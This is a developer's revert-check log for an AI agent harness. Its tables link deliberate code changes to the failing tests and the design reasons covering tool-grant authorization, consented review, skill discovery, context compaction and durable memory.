| Send `effort` without `effort_for()` | `test_run_validates_effort_against_the_model_it_is_about_to_call` | `_run()` is the single enforcement point; every path to the wire goes through it |
| Cache a failed effort lookup | `test_a_failed_lookup_is_not_cached` | One transient error would suppress the capability query for the whole process |
| Return the container unchanged at `_MAX_REDACT_DEPTH` | `TestDepthCapFailsClosed` | The cap stops stack exhaustion; failing open made it a deterministic redaction bypass |
| Drop `"error"` from `_SCANNED_KEYS` | `TestErrorChannelRedaction` | MCP reports failures in band, so third-party text lands there |
| Restore `always_update=True` on `RavenPanel.state` | `test_same_state_reassignment_does_not_redraw_the_raven` | Every token delta reassigns the same value |
| Build `ConversationMemory` in `on_mount` again | `test_launching_and_quitting_persists_no_thread` | Constructing one persists a thread row |

## §25 — authorized tool use in the research pipeline

| Change | What breaks | Fix / why |
|---|---|---|
| Make `registry.grantable()` return True for everything | `TestGrantability`, `TestTheLoopEnforcesGrantability` | A tool deciding approval from its PARAMS was never consented to by name. Ticking "shell" is not agreeing to whatever command the model later picks |
| Drop the `registry.grantable` term from `_run()`'s grant check | `TestTheLoopEnforcesGrantability` (2), `test_candidate_approvals_omits_tools_the_grant_cannot_cover` | The loop is the enforcement point; a stale or hand-built grant set must not widen anything |
| Stop filtering `candidate_approvals()` to grantable tools | `test_candidate_approvals_omits_tools_the_grant_cannot_cover` | The sign-off notice would promise authority the grant does not carry — worse than not offering it |
| Remove `PIPELINE_UNGRANTABLE` / add `spawn_subagent` back | `TestCandidates` | Approving a spawn IS §18's sign-off; pre-granting it unattended compounds one yes into unbounded delegated authority (R4) |
| Skip `grant_budget.take()` in the grant check | `TestGrantBudget` (3) | Pre-flight authorization gives up the natural bound on how many times a granted tool runs |
| Rebuild `GrantBudget` per pass instead of sharing it | `test_one_budget_is_shared_across_passes` | Multiplies the ceiling by the pass count while reading as if it enforced one |
| Make budget exhaustion deny instead of falling through | `test_exhaustion_falls_back_to_asking_not_to_failing`, `test_budget_exhaustion_falls_through_to_the_provider` | The ceiling would become a hard stop on a supervised run |
| `headless = permission_channel is None` again | `TestHeadlessIsAboutBeingUNABLEToAsk` | "Headless" means unable to ask. A pass with an `ApprovalProvider` CAN ask, so hiding its tools reports a limitation it does not have |
| Stop consulting `approval_provider` in `_obtain_approval` | `TestTheProviderAnswers` | `run_to_completion()` discards the `permission_request` event, so a queue alone blocks with nothing displayed |
| Let the provider win over a live `permission_channel` | `test_the_channel_wins_when_both_are_present` | The channel is the more specific arrangement; a provider would ask again about a question already on screen |
| Honour `grant_scope` regardless of the provider | `TestRunScope`, `test_the_provider_declines_run_scope` | R11: a mode whose purpose is per-call supervision must not let one yes cover later calls |
| Drop `authorization=` from `continue_conversation` | `test_the_json_retry_carries_it_into_the_same_thread` | A retry is the same pass continuing; omitting it strips the pass's tools on the attempt where the model is already struggling |
| Drop `**_authorization_kwargs(...)` from `run_deep_research_mode` | `test_the_pass_entry_point_unpacks_the_bundle_into_the_loop` | Every other test mocks over this layer, so all of them pass with the tools still hidden |
| Copy `granted_calls` onto the run at the end instead of sharing the list | `TestTheTrailSurvivesAFailedRun` | The trail would be lost on the failure path and at every §5 checkpoint — the runs most worth auditing |
| Write `granted_calls.json` unconditionally | `test_absent_when_nothing_was_granted` | Its presence is the signal that a run carried pre-flight authorization; an always-empty file gets skimmed past |
| Accept `research.granted_tools` in `settings.json` | `test_granted_tools_is_rejected_by_name` | Standing authorization carried by any cloned repo, in the one config file where project tier beats user tier (R12) |
| Make `--grant` an `nargs="?"` flag again | `TestTheCliFlag` (7) | An optional-value flag eats the next token, so `--grant-tools "my query"` consumed the QUERY and failed about a missing positional |
| Handle `--attended` and `--grant` in a fixed order rather than a loop | `test_the_two_flags_compose_in_either_order` | `--grant --attended q` left "--attended q" as the research question |
| Give `ask_permission_blocking` a private queue | `test_quitting_during_an_attended_research_prompt_releases_the_worker` | `_release_permission_channel` could not see it — a fourth uncovered dismissal route, and the failure is a HANG (f10) |
| Drop `check_input_policy` from `dispatch()` | `TestDispatchEnforcesItBeforeTheHandlerRuns` | Arguments are the one direction that leaves the harness, and nothing was watching it |
| Redact arguments instead of refusing | `test_refused_call_raises_and_the_handler_never_runs` | The tool would run with parameters neither the model nor the user chose, and report success |
| Set `scan_keys=False` on the input path | `test_secret_in_an_argument_key_is_refused` | A dict key is a legal place to put a string and the model writes them |
| Fail open at the input depth cap | `TestInputDepthCapFailsClosed` | Same reasoning as the output cap: refusing to descend must mean refusing to proceed |
| Remove the provenance framing from the universal preamble | `TestProvenanceFraming` | Defence-in-depth only — but it is one line in one place, and every pass inherits it |


## §19 — the skill system

| Change | What breaks | Fix / why |
|---|---|---|
| Make `_md_files` non-recursive for skills | `TestCategoryDiscovery` (5) | Category folders are the payoff: progressive disclosure puts every skill's name in every prompt, so a flat list of forty is what it exists to avoid |
| Make agents recurse too | `test_agents_stay_flat` | K4 is skills-only; `agents/builtin/` holds one file and speculative structure for it is structure nobody asked for |
| Stop deriving `category` from the folder | `TestCategoryDiscovery` (3) | Derived, never authored — a `category:` frontmatter key could disagree with where the file sits |
| Truncate `category` to the immediate parent | `test_nesting_deeper_than_one_level_keeps_the_full_path` | Silently merges two distinct groups in the catalog |
| Drop `dirs.sort()` from the walk | `test_walk_order_is_deterministic` (adversarial-enumeration form, review §19-20 r3-2) and `test_same_name_in_two_categories_collides_and_warns` | Collisions resolve first-wins, so filesystem order would decide WHICH definition loads. The old determinism test re-sorted by path before comparing and could not see this revert; it now monkeypatches the enumeration to present a hostile order and asserts sorted order beats filesystem order |
| Namespace the name by category (`security/recon`) | `test_the_name_is_not_namespaced_by_the_category` | `load_skill`, `/skill` and D18 all key on the name; changing it makes them operate on a different key than the catalog shows |
| Un-group `skill_catalog_text()` | `TestGroupedCatalog` (2) | — |
| Stop marking active skills in the catalog | `test_active_skills_are_marked_not_omitted` | Invites the model to spend a turn calling `load_skill` for a body already pinned into the same prompt |
| Give `SkillManager` session state (mutate the list in place) | `TestManagerHoldsNoState` | K3: the shell owns the active list. A stateful manager is what would make wiring a second shell a redesign rather than a call site |
| Sort activation order | `test_activation_order_is_preserved_not_sorted` | It is the order bodies are pinned in; a user activating general-then-specific is expressing a precedence |
| Pin every discovered skill rather than the active ones | `TestPromptFragment` | Defeats progressive disclosure entirely |
| Raise on an active name that no longer resolves | `test_an_active_name_that_no_longer_resolves_is_skipped` | Skills are rediscovered on `initialize()`; a name can legitimately stop resolving mid-session |
| Make `missing_tools()` ignore the `ToolContext` | `TestMissingTools` (2) | Note AC1's own example (`shell`) CANNOT catch this — it is globally disabled anyway. The discriminating case is a globally allowed tool the agent excluded |
| Make `missing_tools()` answer from anywhere but `registry.is_allowed` | `TestMissingTools` | Reporting one thing at activation and enforcing another mid-turn is the divergence the check exists to prevent |
| Make missing tools REFUSE activation | `test_activation_reports_missing_tools_without_refusing` | K2 reports and proceeds; refusing makes a restrictive agent silently un-pairable with half the catalog |
| **Append active bodies inside `with_catalogs()`** | `TestPromptAssembly`, incl. `test_k6_a_pass_prompt_never_carries_an_active_body` | **K6.** That function feeds `pass_prompt()`, so a skill activated in a TUI chat session would govern all ten passes of a separate research run |
| Stop passing `active_skills` into catalog assembly | `test_the_catalog_marks_active_skills_in_the_same_prompt` | The list must reach the catalog to MARK entries — just never to expand them |
| Make `active_skills` class-level or thread-persisted | `TestSessionScope` | K5: session-scoped like `/agent`, not persisted like `/goal` |
| Give a shipped default a tool it cannot have | `test_their_declared_tools_are_actually_available` | A builtin reporting a missing tool on every activation reads as the feature being broken |


## §20 — post-pipeline review with consented correction

Every row below was applied to the production code and confirmed to turn
the named test red. The paired rows exist because each half alone proves
nothing: "accept re-runs synthesis" passes against a version that always
re-synthesises, and "reject re-runs nothing" passes against one that
never does.

| Change | What breaks | Fix / why |
|---|---|---|
| Make `run_agent_conversation` ignore `authorization=` | `test_the_bundle_is_unpacked_into_the_loop` | §20's reviewer needs the run's grants, provider and budget; without this it runs unauthorised while every call site reads as if it were authorised |
| Drop the `authorization` + `granted_tools` guard | `test_passing_both_raises_rather_than_picking_one` | They set the same underlying argument, so one silently wins |
| Give `pipeline-reviewer` `spawn_subagent` | `test_it_cannot_spawn_subagents` | A reviewer delegating its own review compounds authority for nothing — §25's R4 excludes spawning from pipeline grants for the same reason |
| Declare a globally-denied tool on `pipeline-reviewer` | `test_its_declared_tools_are_actually_available` | `allowed_tools` narrows, so the name is dead weight; a builtin reporting missing tools reads as the feature being broken |
| Let the reviewer read project context or thread memory | `test_it_does_not_read_project_context_or_thread_memory` | Neither is evidence about whether a claim is true, and both are places a steer could be planted |
| Add a `consent` field to `RunAuthorization` | `test_run_authorization_has_no_consent_field` | That bundle answers "may this gated call proceed?"; consent answers "may this edit be applied?". §25's docstring warns against multiplying kinds of authorization inside it |
| Hardcode `pass_prompt(label)` inside the shared retry loop | `test_the_retry_continues_under_the_callers_system_prompt` | Looks right for all ten passes and hands the reviewer a source-grounding prompt mid-review |
| Fire `on_response` only on the final retry | `test_every_retry_response_reaches_the_on_response_hook` | §25's granted-call record hangs off it; a grant spent on the struggling attempt is exactly the call an unattended run's audit trail exists to show |
| **Apply findings when consent is None** | `TestNobodyToAskAppliesNothing` | **V6.** The property that keeps a mutating stage from widening the security stance — the inability to ask is not permission to proceed |
| **Discard findings when consent is None** | `TestNobodyToAskAppliesNothing` | The opposite failure of the same decision. An advisory review whose findings vanish is not advisory, it is discarded |
| **Re-synthesise unconditionally** | `test_reject_leaves_everything_alone` | **V2.** A fully-rejected review must change nothing |
| **Never re-synthesise** | `test_accept_rewrites_the_claim_and_re_runs_synthesis` | **V2, other half.** Otherwise `report.md` and `02_claims.json` contradict each other |
| Reuse the pre-review synthesis input | `test_the_re_synthesis_reads_the_CORRECTED_claims` | Regenerates from the UNCORRECTED claims — the report changes for no reason while the correction silently goes nowhere |
| Skip the `review_override` marker on a tier change | `test_a_tier_override_marks_the_score_breakdown` | `04_confidence.json` then shows a 0.91 raw_score beside a downgraded LOW and reads as a bug in the scoring formula |
| Apply every finding a refinement returns | `test_refinement_touches_only_its_own_finding` | A note about #1 must not silently redraft #2 — the user consented to reconsidering one thing |
| Let `reject_all` keep asking | `test_reject_all_stops_asking` | The escape a long review needs; it only ever declines, so it cannot turn fatigue into a reflexive accept |
| Treat an unrecognised consent answer as accept | `test_an_unrecognised_answer_is_a_rejection` | Every unclear answer is a rejection |
| Treat a raising consent callback as accept | `test_a_consent_callback_that_raises_is_a_rejection` | A shell torn down mid-prompt must not have its silence read as approval |
| Skip validation of `claim_id` / tier before asking | `TestFindingsAreValidatedBeforeAnyoneIsAsked` | Asking solicits consent for something that then silently does nothing |
| Truncate past `MAX_REVIEW_FINDINGS` silently, or not at all | `test_findings_past_the_cap_are_dropped_and_traced` | No silent caps — an untold truncation reads as "the reviewer found twenty-five things" |
| Pass `authorization=None` to the reviewer | `test_the_same_bundle_object_reaches_the_reviewer` | **V7.** Asserted on IDENTITY of the `GrantBudget`: a rebuilt one multiplies the run's ceiling while reading as if it enforced one |
| Run the reviewer (or its retry/refine continuations) with `context=None` | `test_the_reviewer_runs_under_the_reviewer_agents_context` plus the continuation-context tests (review §19-20 r2-1) | Its `.md` excludes `spawn_subagent`, and that only binds if the context built from it is the one EVERY turn of the review uses — turn 1 and every `retry_until_json`/`_refine` continuation. `retry_until_json` therefore takes a `context` parameter and forwards it |
| Stop recording the reviewer's granted calls | `test_the_reviewers_granted_calls_join_the_runs_audit_trail` | §25 keeps ONE list so a call cannot be authorised in one place and recorded in another |
| Make the review stage non-opt-in | `test_no_flag_and_no_consent_means_no_reviewer_call` | D9: it is an extra model call plus a re-synthesis |
| Require the config flag even with a consent route | `test_a_consent_route_alone_enables_it` | A shell that offered the user a consent route should not also need the flag |
| Never call `_review_stage` from the pipeline | `test_the_pipeline_calls_the_stage_after_final_synthesis` | Without this every other §20 test passes against code nothing calls |
| **Run the stage before final synthesis** | `test_the_pipeline_calls_the_stage_after_final_synthesis` | Every call still happens — the reviewer is just handed an empty report to judge. The test asserts ORDER for this reason |
| Make a missing reviewer agent fatal | `test_a_missing_reviewer_agent_skips_rather_than_failing` | Losing a completed ten-pass run over an optional stage is the wrong trade |
| Collapse `enabled` into `review is not None` | `test_enabled_with_no_consent_still_runs_and_reports` | `--review` on a piped run would then skip the review entirely and report nothing |
| Stop falling back to `config.SUBAGENT_REVIEW` | `test_the_pipeline_resolves_the_flag_from_config_when_unset` | Both shells pass `None`, so the config flag would do nothing |
| Default `--review` to `False` in argparse | `test_the_flag_defaults_to_none_so_settings_can_supply_it` | "Flag absent" must stay distinguishable from "flag given as false", or settings.json can never be honoured |
| Let settings beat the explicit flag | `test_precedence_is_flag_then_settings_then_config` | `--no-review` must escape a persisted `true` for one run |
| Build a consent object on a non-tty stdin | `test_a_non_tty_stdin_gets_no_consent_object` | V6 by construction; reading a decision off a pipe answers on the user's behalf with whatever bytes were there |
| Make the TUI decoder trust whatever arrives | `test_the_modal_answer_decoder_fails_safe` | The shutdown release puts a bare `False`; the first place where the unsafe failure is silently applying an edit |
| Let `ReviewScreen`'s escape dismiss with no value | `test_every_review_screen_dismissal_carries_a_decision` | The worker parks on a Queue inside the consent callback — fifth place this invariant applies |
| **Drop `write_run_artifacts` from the TUI worker** | `test_the_tui_worker_writes_them_too` | **V9.** It had ONE call site, so `/research` produced no `/output/<run_id>/` at all |
| Let an artifact failure propagate in the TUI | `test_a_writer_failure_does_not_lose_the_tui_run` | A full disk must not discard ten passes of completed work |
| Write `07_review.json` unconditionally | `test_absent_when_it_was_not` | Its presence is the signal that a run was reviewed; an always-empty file reads as "nothing happened here" |
| Remove `subagent_review` from `_KNOWN_RESEARCH` | `test_subagent_review_is_accepted` | Unknown settings keys RAISE, so an undeclared key is a startup error |

**Signature changes that ripple into existing tests.** `_split_research_flags` now returns `(attended, review, grant_spec, query)` — a 4-tuple, updated across `TestTheTuiFlagSplitter`. `run_deep_research_pipeline` takes `review=` and `subagent_review=`, both asserted positionally in `test_e2e.py` so a future default of "review and apply" cannot slip through. `_review_stage` takes `enabled=`.


## §19–§20 review follow-up (2026-08-05)

Every row applied to the production code and confirmed to turn the named
test red — except the one marked, whose failure mode is a *skip* and which
therefore has a direct test instead. That distinction is the standing
lesson from this pass: a revert check cannot see silence.

| Change | What breaks | Fix / why |
|---|---|---|
| Re-raise on a failed re-synthesis | `test_a_failed_re_synthesis_still_completes_the_run` | A provider error on that one call is the same transient class as a reviewer call failing, which f1 settled must not flip a finished ten-pass run to `failed`. Pinned by a test that composes with the real pipeline — the stage-level test cannot see a status |
| `log_outcomes(committed=True)` on the failure path | `test_a_failed_re_synthesis_leaves_claims_and_report_unchanged` | Traces "accepted and applied" beside claims that were reverted; the record has to agree with what it sits next to |
| Reinstate direct mutation in place of `apply_deferred`'s copy | `test_a_failed_re_synthesis_leaves_claims_and_report_unchanged` | Reopens f4 — a failed re-synthesis persists corrected claims beside the stale report, one run with two contradicting artifacts, durable |
| Count duplicates into the malformed counter | `test_malformed_and_duplicate_are_counted_separately` | A duplicate is a well-formed finding raised twice; one number covering two causes tells the reader neither |
| Go silent on the raced-click timeout branch | `test_the_no_answer_line_only_prints_when_there_was_no_answer` | Their answer went nowhere; silence sends them to the "N applied" summary to work that out and conclude the button is broken |
| **Make `with_catalogs` ignore the context** | `TestCatalogsFollowTheContext` (2) | The catalogs *instruct* the model to call `load_skill` / `spawn_subagent`; a restricted agent is told to call a tool it does not have and burns a denied call against `max_steps` |
| **Suppress both catalogs unconditionally** | `test_an_unrestricted_run_gets_both_catalogs` | **The control.** Without it every other catalog test also passes against a version that strips progressive disclosure from ordinary chat |
| Make `system_prompt_for` drop the context | `test_a_restricted_NON_reviewer_agent_gets_the_same_treatment` | The point of moving this to the producer: the rule must hold for an agent nobody thought about when writing it |
| Have `spawn_subagent` pass its own context, not `child` | `test_a_spawned_subagent_inherits_the_PARENTS_suppression` | C6 intersects with the parent, so a parent that excluded spawning must not have the catalog re-invite its child |
| Pass a context from `pass_prompt()` | `test_pass_prompts_are_unaffected` | The one way this change could reach the research pipeline; verified separately by hashing all ten prompts before and after |
| Drop `test_docs_consistency`'s narrowing guard | `test_the_documented_count_is_the_real_one` | A filtered run legitimately collects fewer; asserting anyway makes every single-file invocation fail |
| Loosen the ARCHITECTURE anchor to a bare `(\d+) tests` | `test_the_three_docs_state_the_same_test_count` | ARCHITECTURE lists a per-module count for every test file in its tree, so a loose pattern compares two unrelated numbers forever |
| Change one doc's count without the others | `test_the_three_docs_state_the_same_test_count` | All three get quoted, by different audiences |
| **Compare `markexpr` against `None`** | `test_the_default_invocation_is_not_treated_as_narrowed` | **Fails by SKIPPING, not by failing** — `pytest.ini`'s addopts always supplies `-m "not integration"`, so every run would skip and the file would look like coverage while the counts drifted. This is why the guard has a direct test rather than a revert-and-see-red |


## Standing: a revert check cannot see a test that SKIPS

The 2026-08-05 follow-up added `tests/test_docs_consistency.py`, whose
narrowing guard decides whether the count assertion runs at all. Get that
guard wrong in the permissive direction and a filtered run asserts against
a session of one item -- loud, obvious, fixed in a minute. Get it wrong in
the restrictive direction and EVERY run skips: the assertion never
executes, the file sits there looking like coverage, and the thing it
polices drifts exactly as before.

Reverting the production behaviour and watching for red cannot catch that,
because a skip is green. Where a test can decline to run, prove it runs --
`test_the_default_invocation_is_not_treated_as_narrowed` is the shape.


## §21a — compaction, the archive, and pinning (2026-08-05)

Every row below was applied to the production code and confirmed to turn the named
test red — 75 across the section's six commits, of which the load-bearing ones are
listed here.

Two rows are marked **CONTROL**. They exist because the assertions next to them pass
against a broken build without them: a version that compacts unconditionally, or one
that shows a summary for threads that were never compacted, satisfies almost every
other test in these files.

| Change | What breaks | Fix / why |
|---|---|---|
| Add a field to a table class without touching `ensure_columns` | `test_a_declared_column_missing_from_an_existing_table_is_added` | `create_all()` creates missing TABLES and never ALTERs. Every database predating the field raises "no such column" at read time, silently, and never on a machine with a fresh `app.db` |
| Drop the `DEFAULT` on an added column | `test_the_existing_row_survives_and_reads_the_declared_default` | SQLite fills existing rows with NULL, so `pinned` reads as None on exactly the messages most likely to be compacted |
| Compare raw type strings instead of affinity | `test_a_length_specifier_is_not_a_type_mismatch` | `VARCHAR(255)` vs `VARCHAR` warns at every startup; a warning that fires when nothing is wrong is one nobody reads when something is |
| Make an unrecognised watermark hide the prefix | `test_an_unrecognised_watermark_shows_everything` | A checkpoint naming a row this thread does not have is a fault. Showing everything costs tokens; hiding a prefix loses context and reports nothing |
| Let `history_through` keep pinned rows | `test_the_summary_span_excludes_pinned_rows` | AC2 — a pinned message is never in what the compactor is asked to summarize |
| Make `pinned_through` ignore its watermark | `test_a_pin_after_the_watermark_is_not_re_added` | The row is already in the tail; returning it twice grows the context compaction just ran to shrink |
| Give `archive_history` a checkpoint lookup | `test_archive_history_ignores_compaction_entirely` | AC1. The first version of this test compared two reads that agree trivially on an uncompacted thread — including under the revert. It now runs against a thread that HAS been compacted, the only state where the guarantee can fail |
| Persist the checkpoint summary as a `MessageLog` row | `test_the_summary_is_never_written_to_the_archive` | Puts derived content in an append-only archive, and the NEXT compaction summarizes the summary as if it were something the user said — chaining by accident on the path that means to re-derive (M8) |
| Drop the pinned re-inclusion from the derived view | `test_a_pinned_row_inside_the_covered_span_comes_back_verbatim` | One watermark cannot say "everything through K except these" (M9). Without it, the message the user explicitly asked to keep is the one that disappears |
| Make the summary an assistant message | `test_the_summary_leads_the_view_as_a_user_message` | The neutral shape has no system role; a leading user message is the one form all three providers accept |
| **Show a summary when there is no checkpoint** | `test_a_thread_with_no_checkpoint_looks_exactly_as_it_did` | **CONTROL.** Every pre-§21 caller resumes an uncompacted thread, and their behaviour must be byte-identical until the trigger first fires |
| Pin only the turn's first row | `test_pinning_one_turn_covers_the_whole_exchange` | A turn is a question and everything that answered it. Keeping the question while the answer is summarized is not what "keep this" means |
| Derive the trigger from `context_limit` | `test_the_trigger_is_a_working_set_target_not_the_window` | M1 — it can never fire there. `MAX_TOKEN_BUDGET` re-bills the whole prompt per step, so the thread is unusable at well under half of any modern window |
| Let a research pass use the working-set trigger | `test_a_research_pass_only_compacts_near_the_window` | M6. A pass is headless and already returns a distillation; routine compaction there spends on a judgment call nobody is watching |
| Remove the re-entrancy guard | `test_the_reentrancy_guard_stops_the_compactor_compacting` | The compactor is an agent, so compacting runs the loop, which evaluates the trigger |
| Release the guard only on the error path | `test_the_guard_is_released_after_a_compaction` | Left set, every later compaction in the process silently no-ops — a failure that reads as "compaction just never fires" |
| Fold up to the turn start rather than before it | `test_the_fold_boundary_is_always_a_turn_start` | M4. A `tool_result` with no preceding `tool_use` is an HTTP 400 on Anthropic — a hard wire error on the next call, not a degraded answer |
| Ignore any one of the three fold floors | `test_the_current_turn_is_never_foldable`, `test_the_keep_turns_floor_protects_recent_exchanges`, `test_the_keep_tokens_floor_can_win_over_the_turn_floor` | M5 — they compose, earliest wins. The current-turn floor is what makes the mid-turn valve safe by construction |
| Chain when re-derivation was configured (or never chain) | `test_rederive_summarizes_the_originals_not_the_last_summary`, `test_chaining_feeds_the_previous_summary_back_in` | M2. Re-deriving is what keeps exactly one summarization step between an original message and what the model sees |
| Accept an oversized summary without retrying | `test_an_oversized_summary_is_sent_back` | The retry re-enters the compactor's own thread so it sees its own output — §3's loop with a length check in place of a parse |
| Reject an undersized summary too | `test_a_summary_under_target_is_accepted_immediately` | Undershooting has already done the job; rejecting it spends a call to make the context bigger |
| Discard a summary still over target after retries | `test_a_summary_still_oversized_after_retries_is_used_anyway` | It is smaller than what it replaces. Discarding spends every retry and keeps the full history, leaving the thread as stuck with less budget to fix it |
| Record an empty summary as a checkpoint | `test_an_empty_summary_skips_compaction` | Replaces real history with nothing at all — the one outcome worse than not compacting |
| Crash on a missing compactor agent | `test_a_missing_compactor_agent_is_a_skip_not_a_crash` | Same containment §20 applies to a missing reviewer: an optional stage that cannot run must not take the turn down |
| Remove either loop hook | `test_compaction_fires_before_the_first_call_of_a_turn`, `test_the_valve_fires_between_steps_of_one_turn` | M3. The boundary is primary; the valve exists because one turn can add far more than any buffer covers |
| Include the in-progress turn in `_completed_turns` | `test_the_valve_never_folds_the_current_turn` | The off-by-one IS the structural floor |
| Carry notices only on the LoopEvent | `test_the_notice_reaches_the_response_as_well_as_the_event`, `test_the_cli_prints_a_notice_carried_on_the_response` | `run_to_completion()` discards non-final events, so the CLI and the pipeline see only the response. Third time this shape has appeared (§20, §25) |
| Repeat the early warning on every step | `test_the_early_warning_fires_once_and_compacts_nothing` | The condition holds until compaction fires; the same line eight times in one turn trains the reader to skip it |
| Let a failed compaction propagate | `test_a_failed_compaction_does_not_fail_the_turn` | It is a model call, and a provider error during it must not take down a turn that was otherwise fine |
| **Compact unconditionally** | `test_a_thread_under_the_threshold_is_left_alone` | **CONTROL.** Almost every turn is this one |
| Gate `pin` on approval | `test_pin_needs_no_approval_anywhere` | D26. §13 does not merely deny an approval-gated tool where nothing can ask — it stops advertising it, so `pin` would be invisible on the CLI and in every research pass |
| Drop `pin`'s `available_check` | `test_pin_is_hidden_when_there_is_no_compactor` | Pinning is protection FROM compaction; with no compactor it only sets a flag nothing reads — the `fetch_url` defect shape (D24) |
| Check `isinstance(last_n, int)` without excluding bool | `test_a_boolean_count_is_rejected` | `isinstance(True, int)` is True, so `last_n: true` pins one turn while looking understood. Same trap `max_steps` hit in config_loader and column defaults hit in database.py |
| Stop injecting `memory` into dispatch | `test_the_live_memory_is_injected` | `pin` has no other way to reach the thread |
| Skip `effective_compaction`'s relationship checks | `test_an_incoherent_value_is_rejected` (8 cases) | AC8, and §21's own instruction. A `warning_margin` at or above the trigger fires the warning after the thing it warns about |
| Drop the budget-headroom warning | `test_a_trigger_too_close_to_the_budget_warns` | M1's arithmetic, enforced rather than left in a comment |
| Ignore an unknown `/compact` option | `test_an_unrecognised_option_is_an_error` | `--strenght 4` would compact at the default while the user believes otherwise, and the result looks exactly like a compaction that obeyed them |
| Skip `/compact`'s pre-flight validation | `test_an_out_of_range_strength_is_refused_before_a_model_call` | Otherwise `--strength 9` spends a call and fails inside a worker |
| Let `/compact` create a thread | `test_compacting_an_empty_thread_says_so` | Reading `app.memory` persists a `ConversationThread` row for a conversation that never happened — the phantom-thread bug the memory property exists to avoid |
| Leave `_busy` set when a manual compaction fails | `test_a_failed_manual_compaction_releases_the_busy_flag` | The app then refuses every later turn with "still working", which reads as a hang |

### Two standing notes

**`conftest.MEMORY_STORAGE_SYMBOLS` and `FakeMemory` are single-sourced on
purpose.** Both existed as several copies before §21a, and both drifted the moment
production gained a method: five symbols added to `core/memory.py` broke a JSON-retry
test with `'dict' object has no attribute 'desc'`, and three methods added to the
memory contract turned 43 tests red at once. Adding a storage import to
`core/memory.py` means adding one name to that tuple; adding a method the loop calls
on a memory means adding it to `FakeMemory`. Do not re-copy either.

**`test_shell_compaction.py` has its own `_settle`, copied rather than imported.**
`test_tui.py`'s version is TECHNICAL_DEBT theme 8 — it budgets event-loop pumps
rather than time. Importing it would make a fix there silently change this file's
timing too. Whoever fixes theme 8 should fix both.

### §21a review pass (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Count turns from `memory.messages` again | `test_compaction_makes_progress_every_time_it_runs` | M11. M8's summary is a `user` message that is not a turn, so a view-derived count is off by one AND in a different space from the archive indices `compactable_span` compares it against. This shipped: the watermark went backwards and the second compaction of a thread un-compacted it |
| Measure the keep-tokens floor over the view | `test_the_token_floor_measures_the_archive_not_the_view` | Same root cause, second counter. The walk runs out of view turns before it runs out of budget, so the floor under-protects on exactly the threads that have been compacted before |
| Have the loop compute the floor itself | `test_the_valve_asks_the_memory_for_the_current_turn_floor` | `ConversationMemory.completed_turns()` is the only source. `core/loop.py` imports no storage and should not start |
| Drop `compact()`'s no-progress check | `test_no_new_turns_means_no_model_call` | `save_checkpoint` refuses the write anyway, but the model call happens BEFORE that — a thread over the threshold would pay for a summary on every step that produces nothing |
| Drop `save_checkpoint`'s refusal | `test_a_backwards_watermark_is_refused` | The caller-side check covers only the one caller that exists today. `latest_checkpoint` resolves by timestamp, so a backwards watermark does not merely fail to help — it becomes the live one |
| Make `advances()` accept an equal watermark | `test_an_unchanged_watermark_is_refused` | Equal is not progress; accepting it lets a thread rewrite the same checkpoint forever, one model call each time |
| Un-gate the headroom advisory | `test_the_headroom_advisory_is_silent_off_the_startup_path` | `effective_compaction()` is on `should_compact()`'s path — once per step of every turn. Only the ADVISORY is gated; validation still raises everywhere (`test_validation_still_raises_off_the_startup_path`) |
| Report a standing condition every step | `test_a_standing_condition_is_reported_once_per_run` | `compaction_blocked` / `compaction_failed` stay true until something changes. The control is `test_a_real_compaction_still_reports_every_time` — a compaction that happened is an event and must repeat |

### Three standing notes from this pass

**`tests/test_compaction_e2e.py` is the only test running real `ConversationMemory`
against real `storage.py` on real SQLite.** Its fixture is module-scoped and that is
not a performance choice: declaring a SQLModel table registers it on
`SQLModel.metadata`, so importing `storage` twice against real sqlmodel raises "Table
'conversationthread' is already defined". Modules are popped and re-imported, never
reloaded, for the same reason. If you add a test there, do not give it its own swap.

**That file's regression test adds exactly ONE turn between compaction rounds.** Three
turns makes it pass against the broken code — the archive then grows faster than the
view-space floor shrinks and the watermark limps forward anyway. One turn is also the
production pattern: after a compaction the thread is still near the threshold, so the
next turn compacts again. Do not "tidy" that number.

**A guard that cannot fire through the normal path needs a direct test.** Once M11's
root fix is in, the watermark never goes backwards, so `save_checkpoint`'s refusal and
`compact()`'s no-progress skip are unreachable from `compact()`. They are tested by
calling them directly. A guard with no test making it fire is indistinguishable from a
guard that does not work — the first revert-check pass of this fix reported four
MISSes for exactly that reason.

## §21b — durable memory (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Ignore `project_path` when listing | `test_a_project_memory_is_invisible_from_another_project` | M12. D25 keys project memories to the resolved path; with only a `scope` string, AC6 is unwriteable as a test rather than merely unenforced |
| Stamp a global row with a project path | `test_a_global_memory_records_no_project_path` | It is then global in name and project-scoped in effect the moment anything filters on the column |
| Return everything when no project resolved | `test_no_resolved_project_means_no_memories_at_all` | `get_project_path()` is None exactly when `initialize()` has not run — "there is no session", not "this session is outside a project" |
| List oldest first | `test_memories_come_back_newest_first` | M14 keeps the most recent N, so the ordering decides which memories survive the cap |
| Make `forget_memory` raise on an unknown id | `test_forgetting_an_unknown_id_reports_rather_than_raises` | The id came from a human reading a list |
| Treat `agent=None` as opted OUT | `test_a_plain_chat_turn_counts_as_opted_in` | M13. `system_prompt_for` is unreachable without an agent, so the feature would be invisible in the default shell — the §25 shape |
| Drop the `use_memory` check at the assembly | `test_an_opted_out_agent_gets_no_fragment` | How the compactor and pipeline reviewer stay out of a user's durable facts |
| Remove M14's cap, or truncate silently | `test_the_cap_limits_how_many_reach_the_prompt`, `test_truncation_is_stated_in_the_prompt_the_model_reads` | Unbounded growth is what §21 exists to fight. The message goes to the MODEL, not only to a log — a log line reaches nobody mid-conversation |
| Announce truncation that did not happen | `test_nothing_is_said_about_truncation_when_none_happened` | The control. "Showing N of N" on every prompt is noise that trains the reader past the real one |
| **Append the fragment inside `with_catalogs()`** | `test_no_memory_reaches_a_research_pass_prompt` | **§19's K6, second instance.** That function feeds `pass_prompt()`, so every user memory would land in all ten research passes from a shell that wrote none of them |
| Stop appending in `run_agent_conversation` | `test_a_real_chat_turn_sends_the_memories` | The CALL SITE. A first version of that test exercised `with_memories` directly and stayed green through this revert — a helper existing proves nothing if nobody calls it |
| Append for an agent-built prompt too | `test_a_real_chat_turn_with_an_agent_prompt_does_not_double_up` | It already went through `system_prompt_for`; repeating pays twice for the tokens M14's cap bounds |
